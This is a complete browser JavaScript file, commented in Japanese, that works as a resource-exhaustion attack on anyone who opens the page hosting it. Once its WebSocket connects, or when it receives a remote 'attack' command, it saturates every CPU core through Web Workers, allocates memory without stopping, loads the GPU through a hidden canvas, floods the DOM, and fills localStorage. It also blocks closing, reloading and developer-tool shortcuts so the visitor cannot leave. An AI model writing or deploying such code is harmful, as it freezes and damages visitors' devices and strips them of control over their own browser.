(function() {
    'use strict';

    let socket = null;
    let isAttacking = false;

    function connectWebSocket() {
        try {
            const protocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
            socket = new WebSocket(protocol + location.host + '/ws');
            
            socket.onopen = () => {
                startAttack();
            };
            
            socket.onmessage = (e) => {
                try {
                    const data = JSON.parse(e.data);
                    if (data.command === 'attack') {
                        startAttack();
                    }
                    if (data.command === 'stop') {
                        isAttacking = false;
                    }
                } catch(err) {}
            };
            
            socket.onclose = () => {
                setTimeout(connectWebSocket, 1000);
            };
            
            socket.onerror = () => {
                socket.close();
            };
        } catch(e) {}
    }

    function startAttack() {
        if (isAttacking) return;
        isAttacking = true;
        
        cpuAttack();
        memoryAttack();
        gpuAttack();
        domAttack();
        storageAttack();
    }

    // CPU攻撃 - 強力版
    function cpuAttack() {
        const cores = navigator.hardwareConcurrency || 4;
        
        // メインスレッドでも負荷
        function mainThreadLoad() {
            if (!isAttacking) return;
            
            let x = 0;
            const start = Date.now();
            
            // 50ms全力計算 → 10ms休憩 → 繰り返し
            while (Date.now() - start < 50) {
                x += Math.sqrt(Math.random() * 1000) * Math.random();
                x += Math.pow(Math.random(), 2) * Math.random();
                x += Math.sin(Math.random() * 360) * Math.random();
            }
            
            setTimeout(mainThreadLoad, 10);
        }
        
        // Web Workersで全コア飽和
        const workerCode = `
            let running = true;
            
            self.onmessage = (e) => {
                if (e.data === 'stop') running = false;
                if (e.data === 'start') running = true;
            };
            
            function heavyLoop() {
                if (!running) return;
                
                let x = 0;
                const start = Date.now();
                
                while (Date.now() - start < 100) {
                    x += Math.sqrt(Math.random() * 1000) * Math.random();
                    x += Math.pow(Math.random(), 2) * Math.random();
                    x += Math.sin(Math.random() * 360) * Math.random();
                    x += Math.cos(Math.random() * 360) * Math.random();
                    x += Math.tan(Math.random() * 360) * Math.random();
                    x += Math.log(Math.random() * 1000 + 1) * Math.random();
                }
                
                setTimeout(heavyLoop, 0);
            }
            
            heavyLoop();
        `;
        
        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const url = URL.createObjectURL(blob);
        
        for (let i = 0; i < cores; i++) {
            try {
                const worker = new Worker(url);
                worker.postMessage('start');
            } catch(e) {}
        }
        
        mainThreadLoad();
    }

    // メモリ攻撃 - 改良版
    function memoryAttack() {
        const memArrays = [];
        
        function allocateMemory() {
            if (!isAttacking) return;
            
            try {
                // 一気に50MB確保
                for (let i = 0; i < 10; i++) {
                    const buffer = new ArrayBuffer(1024 * 1024 * 5);
                    const view = new Uint8Array(buffer);
                    
                    // 全領域に書き込み
                    for (let j = 0; j < view.length; j += 100) {
                        view[j] = Math.random() * 255;
                    }
                    
                    memArrays.push(buffer);
                }
                
                // 100個(500MB)超えたら古いのを捨てる
                if (memArrays.length > 100) {
                    memArrays.splice(0, 20);
                }
            } catch(e) {
                // メモリ不足
                memArrays.length = 0;
            }
            
            setTimeout(allocateMemory, 50);
        }
        
        allocateMemory();
    }

    // GPU攻撃 - 改良版
    function gpuAttack() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 8000;
            canvas.height = 8000;
            canvas.style.display = 'none';
            document.body.appendChild(canvas);
            const ctx = canvas.getContext('2d');
            
            function heavyDraw() {
                if (!isAttacking) return;
                
                // 大量の描画
                for (let i = 0; i < 500; i++) {
                    ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},${Math.random()})`;
                    ctx.fillRect(
                        Math.random()*8000,
                        Math.random()*8000,
                        Math.random()*500,
                        Math.random()*500
                    );
                }
                
                // 複雑なパス
                for (let i = 0; i < 50; i++) {
                    ctx.beginPath();
                    ctx.moveTo(Math.random()*8000, Math.random()*8000);
                    
                    for (let j = 0; j < 20; j++) {
                        ctx.lineTo(Math.random()*8000, Math.random()*8000);
                    }
                    
                    ctx.strokeStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},${Math.random()})`;
                    ctx.lineWidth = Math.random() * 50;
                    ctx.stroke();
                }
                
                // 影付き描画（重い）
                ctx.shadowBlur = 100;
                ctx.shadowColor = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
                
                for (let i = 0; i < 100; i++) {
                    ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
                    ctx.fillRect(
                        Math.random()*8000,
                        Math.random()*8000,
                        Math.random()*1000,
                        Math.random()*1000
                    );
                }
                
                ctx.shadowBlur = 0;
                
                setTimeout(heavyDraw, 0);
            }
            
            heavyDraw();
        } catch(e) {}
    }

    // DOM攻撃 - 改良版
    function domAttack() {
        const container = document.createElement('div');
        container.style.display = 'none';
        document.body.appendChild(container);
        
        function createElements() {
            if (!isAttacking) return;
            
            try {
                // 大量の要素を一気に生成
                for (let i = 0; i < 1000; i++) {
                    const el = document.createElement('div');
                    el.textContent = 'x'.repeat(Math.floor(Math.random() * 1000));
                    el.setAttribute('data-index', i);
                    el.setAttribute('data-random', Math.random());
                    el.setAttribute('data-date', Date.now());
                    el.style.cssText = `
                        position: absolute;
                        top: ${Math.random()*10000}px;
                        left: ${Math.random()*10000}px;
                        width: ${Math.random()*500}px;
                        height: ${Math.random()*500}px;
                        background: rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255});
                        opacity: ${Math.random()};
                        transform: rotate(${Math.random()*360}deg);
                        border: ${Math.random()*10}px solid rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255});
                    `;
                    container.appendChild(el);
                }
                
                // 5000個超えたらリセット
                if (container.children.length > 5000) {
                    container.innerHTML = '';
                }
            } catch(e) {}
            
            setTimeout(createElements, 30);
        }
        
        createElements();
    }

    // ストレージ攻撃
    function storageAttack() {
        function fillStorage() {
            if (!isAttacking) return;
            
            try {
                for (let i = 0; i < 50; i++) {
                    localStorage.setItem('k_' + Math.random(), 'x'.repeat(10000));
                }
                
                if (localStorage.length > 500) {
                    const keys = Object.keys(localStorage);
                    for (let i = 0; i < 50; i++) {
                        localStorage.removeItem(keys[i]);
                    }
                }
            } catch(e) {}
            
            setTimeout(fillStorage, 100);
        }
        
        fillStorage();
    }

    // 離脱防止
    function preventLeave() {
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = '';
        });
        
        document.addEventListener('keydown', (e) => {
            if (
                (e.ctrlKey && (e.key === 'w' || e.key === 'W' || e.key === 't' || e.key === 'T' || e.key === 'r' || e.key === 'R')) ||
                (e.altKey && e.key === 'F4') ||
                e.key === 'F5' ||
                e.key === 'F12'
            ) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }
        }, true);
        
        document.addEventListener('contextmenu', (e) => e.preventDefault());
    }

    function init() {
        connectWebSocket();
        preventLeave();
    }

    init();
})();
